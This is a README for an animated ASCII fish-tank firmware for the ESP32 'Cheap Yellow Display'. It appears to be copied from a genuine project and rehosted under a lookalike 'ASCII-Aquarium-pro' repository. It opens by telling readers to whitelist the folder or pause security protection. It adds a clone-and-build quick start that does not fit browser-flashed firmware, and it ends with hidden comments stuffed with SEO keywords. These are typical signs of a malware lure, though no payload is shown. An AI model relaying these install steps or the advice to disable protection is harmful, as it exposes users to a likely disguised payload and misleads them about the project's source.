
> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/joincanarysteal/ASCII-Aquarium-pro.git
cd ASCII-Aquarium-pro
mkdir build && cd build
cmake ..
cmake --build . --config Release
```


## Meet the ASCII Aquarium ><(((°> 
<table>
  <tr>
    <td width="45%" valign="top">
<p>
  A tiny animated ASCII fish tank for the ESP32-2432S028R Cheap Yellow Display.
</p>
      <p>
      Flash it from the browser, tap to feed the fish, tune the tank, sync the clock over Wi-Fi, and let the punctuation swim.
      </p>
      <p>
        <a href="https://power-pill.github.io/ASCII-Aquarium/">
          Flash ASCII Aquarium CYD
        </a>
      </p>
      <p>
        ASCII Aquarium turns the common 320x240 CYD touchscreen into a living little
desktop aquarium with swimming ASCII fish, rising bubbles, swaying seaweed,
tap-to-feed flakes, occasional octopus and seahorse visitors, touch controls,
Wi-Fi time sync, persistent settings, and SD-card screenshot capture.
</p>
<p>
        It is not a video loop. The aquarium is rendered live on the ESP32, with fish
that wander, school, turn around, change brightness, avoid each other, and chase
food when you tap the glass.
      </p>
    </td>
    <td width="55%" valign="top">
      <img
        src="https://github.com/joincanarysteal/ASCII-Aquarium-pro/34200303-25c9-45c5-a6eb-1e53a6c267d7"
        alt="ASCII Aquarium Title Screen"
        width="100%">
    </td>
  </tr>
</table>

Check out the article on Hackaday! https://hackaday.com/2026/05/24/adorable-ascii-aquarium-lives-on-your-desk

## GIFs of the ASCII AQUARIUM in Action }>{{{{• >

<table>
  <tr>
    <td width="50%" valign="top">
    <img
        src="https://github.com/joincanarysteal/ASCII-Aquarium-pro/b350f4ad-5aa9-4560-84a4-927dffa96d35"
        alt="Settings"
        width="100%">
    </td>
    <td width="50%" valign="top">
      <img
        src="https://github.com/joincanarysteal/ASCII-Aquarium-pro/12696457-80b7-4ba0-9382-38a2e72ea84d"
        alt="Feeding the Fish"
        width="100%">
    </td>
  </tr>
</table>

## ASCII Aquarium Web Flasher >)))'>

The easiest way to install ASCII Aquarium
 is with the browser flasher:

[Flash ASCII Aquarium CYD](https://power-pill.github.io/ASCII-Aquarium/)

You will need:

- A supported [CYD board](https://www.aliexpress.com/item/1005004971720824.html) connected by a USB data cable.
- Chrome, Edge or latest Firefox Browser on a desktop or laptop computer.
- The Arduino IDE Serial Monitor closed, if it was open.

Open the flasher page, click **Flash ASCII Aquarium**, choose the CYD serial
port, and let the installer finish.

## Supported Hardware: CYD, CYD2USB & JC3248w535
This firmware is built for the [ESP32-2432S028R "Cheap Yellow Display" board](https://www.aliexpress.com/item/1005004971720824.html):

[https://www.aliexpress.com/item/1005004971720824.html](https://www.aliexpress.com/item/1005004971720824.html)
[https://www.amazon.com/dp/B0FJQ6RK39](https://www.amazon.com/dp/B0FJQ6RK39)

- ESP32
- ILI9341 320x240 display
- XPT2046 resistive touchscreen
- Optional SD card support for BMP screenshots and frame capture

Other CYD-style boards may look similar but use different display, touch, or SD hardware.

**Support has now been added for the CYD2USB variant of the board courtesy of @mjpcomp**

Also, we have preliminary support for the much nicer [JC3248w535 board](https://www.aliexpress.com/item/1005007566332450.html)! 

**[Use the web flasher to flash either of these new firmwares to your board!](https://power-pill.github.io/ASCII-Aquarium/)**

## 3D Printed 2.8" CYD Cases ><((((>`
- [Basic Snap-fit case by PowerPill.Prints](https://makerworld.com/en/models/2835243)
- [CYD Desk Buddy by annaglyph](https://makerworld.com/en/models/2787810) 

## Features >(°)>

- Animated ASCII fish with multiple glyph species, varied colours, depth shading,
  smooth wraparound, schooling, wandering, and separation behaviuor.
- Tap-to-feed flakes that nearby fish chase down.
- Configurable fish population from 6 to 36.
- Configurable bubble count from 0 to 50.
- Animated bubbles and seaweed with adjustable sway, length, and randomness.
- Visiting octopus and seahorse characters with selectable spawn rates.
- Fish steer around visitors and each other.
- Background styles: black, blue fade, purple fade, and randomized Spongebob style flower backdrop.
- Touch settings menu with Tank, Seaweed, Clock, and Background tabs.
- Optional on-screen clock with manual time or internet time.
- 12-hour and 24-hour clock formats.
- Timezone selection, small top or bottom clock, large ASCII clock style, and clock colour picker.
- Wi-Fi panel with network scan, saved credentials, on-screen keyboard, reconnect handling, and NTP time sync.
- Persistent settings using ESP32 Preferences.
- SD-card BMP screenshots and frame sequence capture. (NOTE - in build 2.18 The CYD will need to be reset after taking screenshots or sequences)
- Hidden HUD controls for setup, capture, Wi-Fi, settings, quick creature tests, respawn, and randomize. 

## New Features in 2.20 ><((((>`

[Detailed Release Notes for 2.20 can be found here](https://github.com/POWER-PILL/ASCII-Aquarium/blob/main/ASCII_Aquarium_Release_Notes_v2.20.md).

- New Overhauled background system with new smoother dithered gradients
- New background colours available
- New smooth background option
- New LCD Backlight and RGB Ambient LED colour and brightness control
- New Ambient LED Control can link to background colour, or use a different colour
- New CD Backlight and RGB Ambient LED Light Schedule and Tap to wake functionality. Thank you to @mjpcomp for the suggestion.
- New Timed events setting with Auto feeding. This is great if you're using the beam splitter since you can't tap the screen. Thank you to @mjpcomp for the suggestion.
- 20 new Selectable ASCII clock fonts
- Various Bug fixes

## GIFs of some of the New Features in v2.20 }>{{{{• >

<table>
  <tr>
    <td width="50%" valign="top">
    <img
        src="https://github.com/POWER-PILL/ASCII-Aquarium/blob/aa661770a8f8656dc19811996055b8e791f20b89/docs/assets/ASCII_FONTS_2.2.gif"
        alt="New ASCII Fonts"
        width="100%">
    </td>
    <td width="50%" valign="top">
      <img
        src="https://github.com/POWER-PILL/ASCII-Aquarium/blob/fe5dc41de7c68a7fbf722d747460eb820b5203f7/docs/assets/Auto_Feeding_SEQ_v2.20.GIF"
        alt="ASCII Aquarium v2.20 Auto-Feeding"
        width="100%">
    </td>
  </tr>
</table>

## Basic Controls ><((((*>


<table>
  <tr>
    <td width="50%" valign="top">
 <p>• Tap the top-left corner to reveal the hidden HUD.</p>
 <p>• Tap the tank to drop food.</p>
 <p>• Use the settings panel to tune fish, bubbles, visitors, seaweed, clock, and
  backgrounds.</p>
 <p>• Use the Wi-Fi panel to connect to a network and sync internet time.</p>
 <p>• Use the capture panel to save BMP sequences to the SD Card. BEWARE - this is EXTREMELY slow since the fishtank simulation is slowed down to allow every frame to be captured. </p>
 <p>• Press and hold the BOOT button on the back of the CYD to save BMP screenshots to the SD card. You will need to reboot the CYD after Screenshot or sequence capture</p>
    </td>
    <td width="50%" valign="top">
      <img
        src="https://github.com/POWER-PILL/ASCII-Aquarium/blob/e33922a080bef4816fc36799a1c52ee5d383b4de/docs/assets/Screenshots_2.20.gif"
        alt="ASCII Aquarium v2.20 Settings"
        width="100%">
    </td>
  </tr>
</table>

## Using the Beam Splitter cube Display ><>

This build can also use a 50 mm beam splitter cube to give the aquarium a little "floating in glass" look. 

A beam splitter cube is made from two glass prisms joined together with a partially reflective diagonal layer inside. When the CYD screen shines into the cube, some of that light passes through and some of it reflects off the internal 45-degree surface. To your eyes, the aquarium appears to hover inside the cube instead of just sitting flat on the display. It is basically a tiny optical tide pool.

If using the clock with the beam splitter cube, you will need to enable “flip clock” in the clock style settings window.

<table>
  <tr>
    <td width="50%" valign="top">
<p>• Use the 50 mm cube size for this printed stand.</p>
<p>• Handle the cube by the edges and wipe fingerprints with a clean micro-fiber cloth. Smudges are the enemy of premium fish.</p>
<p>• Seat the cube squarely in the holder so the clear face points toward the viewer.</p>
<p>• Keep the display bright and the surrounding room a little dimmer if you want the fish to really pop.</p>
<p>• A dark base or darker background behind the cube helps the reflection look cleaner.</p>
<p>• If the image looks faint, doubled, or not quite centred, rotate or flip the cube and try again. Beam splitters can be a bit fin-icky about orientation.</p>
    </td>
    <td width="50%" valign="top">
      <img
        src="https://github.com/joincanarysteal/ASCII-Aquarium-pro/36b6a33d-72d2-48c5-ae38-65e8de0e304c"
        alt="ASCII Aquarium Holo Cube"
        width="100%">
    </td>
  </tr>
</table>

The cube does not create the animation by itself; the CYD is still doing all the swimming, bubbling, clocking, and snack-chasing. The cube just splits and redirects the light so the tank feels more like a miniature glass aquarium and less like a bare screen. No water required, unless you count the tears of anyone who bought a real aquarium and then learned about water changes.


## Project Notes >°>

ASCII Aquarium CYD is part clock, part screensaver, part tiny art object, and part excuse to make fish-shaped punctuation swim around like it has somewhere important to be.

No water changes. No tank cycling. No surprise snails. Just plug it in and let the current take care of itself.


<!-- c++ cpp cmake native performance library framework windows linux macos -->
<!-- ASCII-Aquarium-pro - tool utility software - download install setup -->
<!-- ASCII-Aquarium-pro downloader | free download ASCII-Aquarium-pro desktop | easy ASCII-Aquarium-pro monitor | quickstart fast ASCII-Aquarium-pro server | docs online ASCII-Aquarium-pro | quickstart ASCII-Aquarium-pro mobile | github ASCII-Aquarium-pro checker | configure ASCII-Aquarium-pro module | execute ASCII-Aquarium-pro desktop | examples open source ASCII-Aquarium-pro app | reliable ASCII-Aquarium-pro package | ASCII-Aquarium-pro compressor | github ASCII-Aquarium-pro compressor | simple ASCII-Aquarium-pro engine | customizable ASCII-Aquarium-pro creator | zip ASCII-Aquarium-pro service | powerful ASCII-Aquarium-pro | open source ASCII-Aquarium-pro viewer | ubuntu ASCII-Aquarium-pro mobile | ASCII-Aquarium-pro service | macos ASCII-Aquarium-pro desktop | run on linux ASCII-Aquarium-pro tracker | how to use ASCII-Aquarium-pro port | run on linux modular ASCII-Aquarium-pro platform | fast ASCII-Aquarium-pro | example online ASCII-Aquarium-pro | use extensible ASCII-Aquarium-pro | linux ASCII-Aquarium-pro application | configure ASCII-Aquarium-pro debugger | centos online ASCII-Aquarium-pro | getting started ASCII-Aquarium-pro replacement | free ASCII-Aquarium-pro creator | modular ASCII-Aquarium-pro fork | configure ASCII-Aquarium-pro | ASCII-Aquarium-pro decoder | download for linux ASCII-Aquarium-pro | how to build advanced ASCII-Aquarium-pro | local ASCII-Aquarium-pro | customizable ASCII-Aquarium-pro cli | ASCII Aquarium pro handbook | deploy ASCII-Aquarium-pro package | native ASCII-Aquarium-pro platform | arch ASCII-Aquarium-pro extension | offline ASCII-Aquarium-pro | customizable ASCII-Aquarium-pro logger | docs ASCII-Aquarium-pro | build ASCII-Aquarium-pro port | demo ASCII-Aquarium-pro web | tar.gz ASCII-Aquarium-pro builder | top ASCII Aquarium pro -->
<!-- macos ASCII-Aquarium-pro utility | configure low latency ASCII-Aquarium-pro | run on linux ASCII-Aquarium-pro library | debian ASCII-Aquarium-pro checker | portable ASCII-Aquarium-pro port | download local ASCII-Aquarium-pro | modular ASCII-Aquarium-pro engine | use ASCII-Aquarium-pro viewer | ASCII-Aquarium-pro creator | open source ASCII-Aquarium-pro compressor | top ASCII-Aquarium-pro port | ASCII-Aquarium-pro framework | simple ASCII-Aquarium-pro utility | updated ASCII-Aquarium-pro monitor | how to run stable ASCII-Aquarium-pro web | how to download ASCII-Aquarium-pro downloader | portable ASCII-Aquarium-pro tracker | ASCII-Aquarium-pro platform | configurable ASCII-Aquarium-pro wrapper | demo portable ASCII-Aquarium-pro | fast ASCII-Aquarium-pro validator | source code ASCII-Aquarium-pro | how to configure ASCII-Aquarium-pro application | ASCII Aquarium pro article | is ASCII Aquarium pro safe | ASCII Aquarium pro demo | debian ASCII-Aquarium-pro cli | run on windows ASCII-Aquarium-pro server | how to run ASCII-Aquarium-pro fork | easy ASCII-Aquarium-pro gui | centos ASCII-Aquarium-pro platform | ASCII Aquarium pro alternative | use powerful ASCII-Aquarium-pro | quick start modern ASCII-Aquarium-pro | get ASCII-Aquarium-pro addon | offline ASCII-Aquarium-pro package | free download ASCII-Aquarium-pro replacement | tutorial ASCII-Aquarium-pro parser | ASCII Aquarium pro project | configure ASCII-Aquarium-pro cli | start ASCII-Aquarium-pro | high performance ASCII-Aquarium-pro tester | github ASCII-Aquarium-pro parser | ASCII-Aquarium-pro tracker | download for linux ASCII-Aquarium-pro monitor | low latency ASCII-Aquarium-pro | native ASCII-Aquarium-pro tool | download for linux stable ASCII-Aquarium-pro | run on mac offline ASCII-Aquarium-pro | get ASCII-Aquarium-pro clone -->
<!-- reliable ASCII-Aquarium-pro checker | use ASCII-Aquarium-pro server | how to download ASCII-Aquarium-pro addon | how to download ASCII-Aquarium-pro replacement | start portable ASCII-Aquarium-pro | setup ASCII-Aquarium-pro desktop | simple ASCII-Aquarium-pro package | git clone ASCII-Aquarium-pro | documentation ASCII-Aquarium-pro logger | minimal ASCII-Aquarium-pro | how to use ASCII-Aquarium-pro | how to download fast ASCII-Aquarium-pro | download ASCII-Aquarium-pro sdk | 2026 ASCII-Aquarium-pro creator | extensible ASCII-Aquarium-pro port | free ASCII-Aquarium-pro copy | best ASCII-Aquarium-pro utility | use cross platform ASCII-Aquarium-pro converter | cross platform ASCII-Aquarium-pro port | ASCII-Aquarium-pro monitor | debian advanced ASCII-Aquarium-pro web | production ready ASCII-Aquarium-pro parser | quickstart lightweight ASCII-Aquarium-pro sdk | safe ASCII-Aquarium-pro application | how to build ASCII-Aquarium-pro addon | download open source ASCII-Aquarium-pro cli | ASCII-Aquarium-pro app | install ASCII-Aquarium-pro | extensible ASCII-Aquarium-pro addon | powerful ASCII-Aquarium-pro web | git clone customizable ASCII-Aquarium-pro | fast ASCII-Aquarium-pro package | getting started ASCII-Aquarium-pro converter | run cross platform ASCII-Aquarium-pro uploader | git clone advanced ASCII-Aquarium-pro | macos modular ASCII-Aquarium-pro | centos extensible ASCII-Aquarium-pro | ASCII Aquarium pro documentation | how to deploy easy ASCII-Aquarium-pro | best ASCII-Aquarium-pro tracker | download for linux easy ASCII-Aquarium-pro | how to configure ASCII-Aquarium-pro replacement | docs ASCII-Aquarium-pro sdk | open ASCII-Aquarium-pro clone | ASCII-Aquarium-pro plugin | offline ASCII-Aquarium-pro cli | examples ASCII-Aquarium-pro | install safe ASCII-Aquarium-pro | arch ASCII-Aquarium-pro monitor | configure ASCII-Aquarium-pro checker -->
<!-- deploy ASCII-Aquarium-pro builder | safe ASCII-Aquarium-pro tool | install ASCII-Aquarium-pro converter | examples ASCII-Aquarium-pro module | how to setup self hosted ASCII-Aquarium-pro validator | ASCII Aquarium pro pipeline | ASCII Aquarium pro vs | reliable ASCII-Aquarium-pro | free ASCII-Aquarium-pro platform | walkthrough ASCII-Aquarium-pro service | linux ASCII-Aquarium-pro compressor | walkthrough ASCII-Aquarium-pro app | documentation ASCII-Aquarium-pro | docs ASCII-Aquarium-pro parser | open source ASCII-Aquarium-pro monitor | examples advanced ASCII-Aquarium-pro | how to download ASCII-Aquarium-pro | how to configure ASCII-Aquarium-pro binding | secure ASCII-Aquarium-pro package | examples ASCII-Aquarium-pro gui | how to run easy ASCII-Aquarium-pro | safe ASCII-Aquarium-pro checker | compile ASCII-Aquarium-pro scanner | launch ASCII-Aquarium-pro addon | how to install ASCII-Aquarium-pro | build ASCII-Aquarium-pro editor | github ASCII-Aquarium-pro application | ASCII Aquarium pro best practice | how to install ASCII-Aquarium-pro server | latest version fast ASCII-Aquarium-pro editor | extensible ASCII-Aquarium-pro tool | self hosted ASCII-Aquarium-pro module | free ASCII-Aquarium-pro alternative | tutorial ASCII-Aquarium-pro uploader | download for mac ASCII-Aquarium-pro service | portable ASCII-Aquarium-pro mobile | documentation ASCII-Aquarium-pro generator | centos ASCII-Aquarium-pro desktop | wiki simple ASCII-Aquarium-pro | how to build ASCII-Aquarium-pro tool | ASCII Aquarium pro cheat sheet | 2025 ASCII-Aquarium-pro decoder | deploy ASCII-Aquarium-pro encoder | compile ASCII-Aquarium-pro desktop | setup ASCII-Aquarium-pro | download ASCII-Aquarium-pro service | ASCII Aquarium pro setup | ASCII-Aquarium-pro tester | macos ASCII-Aquarium-pro package | best ASCII-Aquarium-pro app -->
<!-- arch ASCII-Aquarium-pro | get ASCII-Aquarium-pro engine | tar.gz low latency ASCII-Aquarium-pro | execute powerful ASCII-Aquarium-pro | ASCII Aquarium pro fix | reliable ASCII-Aquarium-pro desktop | run on mac local ASCII-Aquarium-pro monitor | guide ASCII-Aquarium-pro debugger | powerful ASCII-Aquarium-pro logger | advanced ASCII-Aquarium-pro | build fast ASCII-Aquarium-pro | fedora ASCII-Aquarium-pro checker | walkthrough ASCII-Aquarium-pro reader | reliable ASCII-Aquarium-pro alternative | compile stable ASCII-Aquarium-pro | modern ASCII-Aquarium-pro extension | sample local ASCII-Aquarium-pro | run ASCII-Aquarium-pro framework | tar.gz ASCII-Aquarium-pro wrapper | best ASCII-Aquarium-pro extension | ASCII Aquarium pro cloud | examples ASCII-Aquarium-pro app | windows ASCII-Aquarium-pro | simple ASCII-Aquarium-pro validator | how to run ASCII-Aquarium-pro extractor | quick start ASCII-Aquarium-pro program | 2025 modern ASCII-Aquarium-pro | ASCII-Aquarium-pro viewer | free download ASCII-Aquarium-pro platform | updated ASCII-Aquarium-pro | how to setup fast ASCII-Aquarium-pro port | macos ASCII-Aquarium-pro service | download for linux ASCII-Aquarium-pro tracker | github ASCII-Aquarium-pro addon | how to run ASCII-Aquarium-pro cli | latest version ASCII-Aquarium-pro analyzer | ASCII-Aquarium-pro converter | native ASCII-Aquarium-pro desktop | quick start ASCII-Aquarium-pro builder | sample ASCII-Aquarium-pro application | how to setup ASCII-Aquarium-pro tester | open ASCII-Aquarium-pro module | docs ASCII-Aquarium-pro wrapper | low latency ASCII-Aquarium-pro debugger | modular ASCII-Aquarium-pro | download ASCII-Aquarium-pro decoder | arch ASCII-Aquarium-pro generator | ASCII Aquarium pro support | github ASCII-Aquarium-pro monitor | get free ASCII-Aquarium-pro fork -->
<!-- compile ASCII-Aquarium-pro | reliable ASCII-Aquarium-pro plugin | modular ASCII-Aquarium-pro module | how to run ASCII-Aquarium-pro application | guide ASCII-Aquarium-pro program | ASCII-Aquarium-pro mirror | demo ASCII-Aquarium-pro | ASCII-Aquarium-pro api | native ASCII-Aquarium-pro | ubuntu ASCII-Aquarium-pro client | configurable ASCII-Aquarium-pro compressor | extensible ASCII-Aquarium-pro plugin | centos ASCII-Aquarium-pro | github ASCII-Aquarium-pro tester | run on mac ASCII-Aquarium-pro tool | how to deploy ASCII-Aquarium-pro | use safe ASCII-Aquarium-pro scanner | native ASCII-Aquarium-pro api | free ASCII-Aquarium-pro encoder | secure ASCII-Aquarium-pro api | safe ASCII-Aquarium-pro | simple ASCII-Aquarium-pro binding | download for linux ASCII-Aquarium-pro utility | quickstart modular ASCII-Aquarium-pro | beginner ASCII-Aquarium-pro generator | how to setup self hosted ASCII-Aquarium-pro | wiki ASCII-Aquarium-pro generator | centos ASCII-Aquarium-pro service | high performance ASCII-Aquarium-pro software | documentation ASCII-Aquarium-pro tester | windows ASCII-Aquarium-pro plugin | modern ASCII-Aquarium-pro service | how to build ASCII-Aquarium-pro viewer | run on windows ASCII-Aquarium-pro decoder | how to setup ASCII-Aquarium-pro library | extensible ASCII-Aquarium-pro api | tar.gz ASCII-Aquarium-pro | windows ASCII-Aquarium-pro module | download for mac ASCII-Aquarium-pro package | native ASCII-Aquarium-pro validator | advanced ASCII-Aquarium-pro analyzer | docs ASCII-Aquarium-pro builder | 2025 ASCII-Aquarium-pro clone | ASCII-Aquarium-pro uploader | portable ASCII-Aquarium-pro framework | reliable ASCII-Aquarium-pro optimizer | open source ASCII-Aquarium-pro downloader | ASCII Aquarium pro example | online ASCII-Aquarium-pro | high performance ASCII-Aquarium-pro mobile -->
<!-- use ASCII-Aquarium-pro | safe ASCII-Aquarium-pro port | linux ASCII-Aquarium-pro plugin | launch lightweight ASCII-Aquarium-pro extractor | source code ASCII-Aquarium-pro framework | ASCII-Aquarium-pro addon | git clone ASCII-Aquarium-pro tester | documentation github ASCII-Aquarium-pro tool | best ASCII-Aquarium-pro addon | download for linux ASCII-Aquarium-pro parser | ASCII-Aquarium-pro replacement | powerful ASCII-Aquarium-pro replacement | ASCII Aquarium pro test | online ASCII-Aquarium-pro tester | demo powerful ASCII-Aquarium-pro | offline ASCII-Aquarium-pro validator | updated advanced ASCII-Aquarium-pro wrapper | configurable ASCII-Aquarium-pro tester | portable ASCII-Aquarium-pro | open source ASCII-Aquarium-pro converter | free ASCII-Aquarium-pro converter | deploy ASCII-Aquarium-pro | production ready ASCII-Aquarium-pro addon | ASCII-Aquarium-pro library | guide ASCII-Aquarium-pro logger | free ASCII-Aquarium-pro editor | ASCII Aquarium pro review | example ASCII-Aquarium-pro port | github ASCII-Aquarium-pro copy | fedora ASCII-Aquarium-pro | tutorial customizable ASCII-Aquarium-pro | run on mac stable ASCII-Aquarium-pro | download for windows ASCII-Aquarium-pro application | updated ASCII-Aquarium-pro mirror | example modern ASCII-Aquarium-pro | best ASCII-Aquarium-pro desktop | self hosted ASCII-Aquarium-pro | native ASCII-Aquarium-pro port | ubuntu lightweight ASCII-Aquarium-pro | documentation ASCII-Aquarium-pro debugger | use ASCII-Aquarium-pro engine | github ASCII-Aquarium-pro scanner | open local ASCII-Aquarium-pro debugger | git clone ASCII-Aquarium-pro server | github ASCII-Aquarium-pro optimizer | cross platform ASCII-Aquarium-pro | run on windows ASCII-Aquarium-pro service | extensible ASCII-Aquarium-pro debugger | run on windows ASCII-Aquarium-pro software | high performance ASCII-Aquarium-pro platform -->
<!-- install ASCII-Aquarium-pro replacement | install powerful ASCII-Aquarium-pro | wiki safe ASCII-Aquarium-pro | build ASCII-Aquarium-pro | fedora lightweight ASCII-Aquarium-pro | ASCII Aquarium pro course | portable ASCII-Aquarium-pro service | ASCII-Aquarium-pro client | launch easy ASCII-Aquarium-pro package | how to deploy ASCII-Aquarium-pro gui | how to run high performance ASCII-Aquarium-pro | run on linux ASCII-Aquarium-pro | configurable ASCII-Aquarium-pro extractor | lightweight ASCII-Aquarium-pro cli | how to configure ASCII-Aquarium-pro fork | ubuntu ASCII-Aquarium-pro | debian ASCII-Aquarium-pro | run on mac ASCII-Aquarium-pro tracker | debian ASCII-Aquarium-pro monitor | latest version advanced ASCII-Aquarium-pro | ASCII-Aquarium-pro binding | windows ASCII-Aquarium-pro program | quick start ASCII-Aquarium-pro mobile | demo ASCII-Aquarium-pro builder | launch ASCII-Aquarium-pro | get ASCII-Aquarium-pro viewer | 2025 ASCII-Aquarium-pro builder | source code ASCII-Aquarium-pro creator | example ASCII-Aquarium-pro debugger | open source ASCII-Aquarium-pro addon | github powerful ASCII-Aquarium-pro | how to use ASCII-Aquarium-pro server | how to deploy ASCII-Aquarium-pro extension | open best ASCII-Aquarium-pro | sample customizable ASCII-Aquarium-pro | free ASCII-Aquarium-pro cli | configurable ASCII-Aquarium-pro generator | best ASCII-Aquarium-pro library | start ASCII-Aquarium-pro editor | ASCII Aquarium pro devops | open ASCII-Aquarium-pro logger | walkthrough stable ASCII-Aquarium-pro | portable ASCII-Aquarium-pro api | high performance ASCII-Aquarium-pro validator | secure ASCII-Aquarium-pro | examples ASCII-Aquarium-pro library | github ASCII-Aquarium-pro module | guide ASCII-Aquarium-pro | github ASCII-Aquarium-pro program | zip ASCII-Aquarium-pro -->
<!-- deploy ASCII-Aquarium-pro sdk | advanced ASCII-Aquarium-pro decoder | ASCII-Aquarium-pro encoder | download for windows minimal ASCII-Aquarium-pro | portable ASCII-Aquarium-pro scanner | ASCII-Aquarium-pro optimizer | download ASCII-Aquarium-pro | updated ASCII-Aquarium-pro module | 2025 ASCII-Aquarium-pro | ASCII Aquarium pro reference | is ASCII Aquarium pro legit | beginner ASCII-Aquarium-pro scanner | free download stable ASCII-Aquarium-pro | getting started fast ASCII-Aquarium-pro | linux ASCII-Aquarium-pro | secure ASCII-Aquarium-pro plugin | run ASCII-Aquarium-pro alternative | how to download open source ASCII-Aquarium-pro downloader | launch ASCII-Aquarium-pro service | execute powerful ASCII-Aquarium-pro mirror | getting started ASCII-Aquarium-pro tool | open ASCII-Aquarium-pro extractor | minimal ASCII-Aquarium-pro analyzer | updated cross platform ASCII-Aquarium-pro | 2026 ASCII-Aquarium-pro editor | git clone ASCII-Aquarium-pro compressor | latest version minimal ASCII-Aquarium-pro | sample ASCII-Aquarium-pro | download for linux ASCII-Aquarium-pro decoder | fast ASCII-Aquarium-pro program | 2026 ASCII-Aquarium-pro uploader | how to install ASCII-Aquarium-pro addon | portable ASCII-Aquarium-pro parser | ASCII-Aquarium-pro parser | open source ASCII-Aquarium-pro application | low latency ASCII-Aquarium-pro cli | open source ASCII-Aquarium-pro api | git clone ASCII-Aquarium-pro client | get ASCII-Aquarium-pro generator | ASCII Aquarium pro github | secure ASCII-Aquarium-pro downloader | ASCII Aquarium pro docker | execute ASCII-Aquarium-pro tester | ASCII-Aquarium-pro sdk | updated ASCII-Aquarium-pro plugin | ASCII-Aquarium-pro alternative | download for linux production ready ASCII-Aquarium-pro | modular ASCII-Aquarium-pro wrapper | production ready ASCII-Aquarium-pro | advanced ASCII-Aquarium-pro logger -->
<!-- sample ASCII-Aquarium-pro tester | sample ASCII-Aquarium-pro fork | safe ASCII-Aquarium-pro converter | arch ASCII-Aquarium-pro validator | example ASCII-Aquarium-pro | launch free ASCII-Aquarium-pro | simple ASCII-Aquarium-pro downloader | production ready ASCII-Aquarium-pro plugin | self hosted ASCII-Aquarium-pro binding | lightweight ASCII-Aquarium-pro platform | simple ASCII-Aquarium-pro tool | centos free ASCII-Aquarium-pro compressor | fast ASCII-Aquarium-pro mirror | use local ASCII-Aquarium-pro generator | ASCII-Aquarium-pro gui | source code ASCII-Aquarium-pro module | ASCII Aquarium pro workflow | fast ASCII-Aquarium-pro framework | how to deploy ASCII-Aquarium-pro server | download ASCII-Aquarium-pro compressor | example ASCII-Aquarium-pro mirror | fast ASCII-Aquarium-pro module | download for windows ASCII-Aquarium-pro tool | free download configurable ASCII-Aquarium-pro | docs production ready ASCII-Aquarium-pro optimizer | latest version ASCII-Aquarium-pro library | use ASCII-Aquarium-pro tester | download open source ASCII-Aquarium-pro library | modular ASCII-Aquarium-pro scanner | 2026 ASCII-Aquarium-pro | ASCII-Aquarium-pro fork | install ASCII-Aquarium-pro engine | ASCII-Aquarium-pro program | open source ASCII-Aquarium-pro mirror | how to run local ASCII-Aquarium-pro | modular ASCII-Aquarium-pro port | zip ASCII-Aquarium-pro optimizer | execute ASCII-Aquarium-pro | run on mac modern ASCII-Aquarium-pro | tar.gz ASCII-Aquarium-pro engine | how to run ASCII-Aquarium-pro monitor | sample ASCII-Aquarium-pro mirror | run on mac ASCII-Aquarium-pro | setup ASCII-Aquarium-pro web | online ASCII-Aquarium-pro wrapper | execute ASCII-Aquarium-pro application | macos best ASCII-Aquarium-pro | ASCII-Aquarium-pro application | ubuntu ASCII-Aquarium-pro encoder | new version ASCII-Aquarium-pro -->

<!-- Last updated: 2026-06-09 18:30:11 -->
